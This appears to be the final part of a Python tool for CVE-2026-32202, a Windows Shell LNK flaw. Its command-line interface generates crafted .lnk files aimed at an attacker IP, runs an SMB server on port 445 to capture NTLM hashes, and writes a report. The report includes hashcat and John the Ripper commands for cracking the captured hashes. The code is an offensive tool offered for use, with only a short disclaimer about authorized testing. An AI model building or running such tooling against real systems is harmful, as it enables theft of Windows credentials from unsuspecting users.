        report.append("# Hashcat (NTLMv2)")
        report.append("hashcat -m 5600 hashes.txt rockyou.txt")
        report.append("")
        report.append("# John the Ripper")
        report.append("john --format=netntlmv2 hashes.txt")
        report.append("```")
        report.append("")
        return "\n".join(report)


# =============================================================================
# CLI ENTRY POINT
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-32202: Windows Shell LNK NTLM Hash Capture Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate all .lnk payloads
  python cve_2026_32202.py generate --attacker 192.168.1.100

  # Start capture server
  python cve_2026_32202.py capture --port 445

  # Full demo (generate + capture)
  python cve_2026_32202.py demo --attacker 192.168.1.100

  # Show attack flow diagram
  python cve_2026_32202.py explain

  # List scenarios
  python cve_2026_32202.py list

⚠️  For authorized security testing and education only.
""")

    sub = parser.add_subparsers(dest='command')

    # Generate
    gen = sub.add_parser('generate', help='Generate crafted .lnk files')
    gen.add_argument('--attacker', default='192.168.1.100', help='Attacker IP/hostname')
    gen.add_argument('--scenario', type=int, default=-1, help='Scenario index (default: all)')
    gen.add_argument('--output', default='./cve-2026-32202-output', help='Output directory')

    # Capture
    cap = sub.add_parser('capture', help='Start NTLM capture server')
    cap.add_argument('--interface', default='0.0.0.0', help='Listen interface')
    cap.add_argument('--port', type=int, default=445, help='Listen port')

    # Demo (generate + capture)
    demo = sub.add_parser('demo', help='Full demo: generate .lnk + start capture')
    demo.add_argument('--attacker', default='0.0.0.0', help='Attacker IP')
    demo.add_argument('--port', type=int, default=445, help='SMB listen port')

    # Explain
    sub.add_parser('explain', help='Show attack flow diagram')

    # List
    sub.add_parser('list', help='List attack scenarios')

    # Report
    rep = sub.add_parser('report', help='Generate markdown report')
    rep.add_argument('--output', default='cve-2026-32202-report.md', help='Report file')

    args = parser.parse_args()

    print("""
╔═══════════════════════════════════════════════════════════════╗
║  🔓 CVE-2026-32202: Windows Shell LNK NTLM Hash Capture      ║
║     CWE-693 | CVSS 4.3 | MITRE T1187                        ║
║     KaliAgent v4 Integration                                  ║
╚═══════════════════════════════════════════════════════════════╝
""")

    d = CVE2026_32202_Demo()

    if args.command == 'generate':
        if args.scenario >= 0:
            d.generate_lnk(args.scenario, args.attacker, args.output)
        else:
            d.generate_all_lnk(args.attacker, args.output)

    elif args.command == 'capture':
        server = d.start_capture_server(args.interface, args.port)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
            print(f"\n🔑 Captured {len(server.captured)} hashes")

    elif args.command == 'demo':
        d.generate_all_lnk(args.attacker)
        server = d.start_capture_server('0.0.0.0', args.port)
        print(f"\n📝 .lnk files generated in {d.output_dir}/")
        print(f"🔓 Capture server listening on 0.0.0.0:{args.port}")
        print(f"   Place .lnk files on a Windows system and watch for hashes")
        print(f"   Press Ctrl+C to stop\n")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
            print(f"\n🔑 Captured {len(server.captured)} hashes")
            if server.captured:
                report = d.generate_report()
                Path("cve-2026-32202-report.md").write_text(report)
                print("📊 Report saved to cve-2026-32202-report.md")

    elif args.command == 'explain':
        d.print_attack_flow()
        for i in range(len(SCENARIOS)):
            d.print_scenario(i)

    elif args.command == 'list':
        for i, sc in enumerate(SCENARIOS):
            print(f"  [{i}] {sc.name} — {sc.technique} ({sc.mitre})")

    elif args.command == 'report':
        report = d.generate_report()
        Path(args.output).write_text(report)
        print(f"📊 Report saved to {args.output}")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()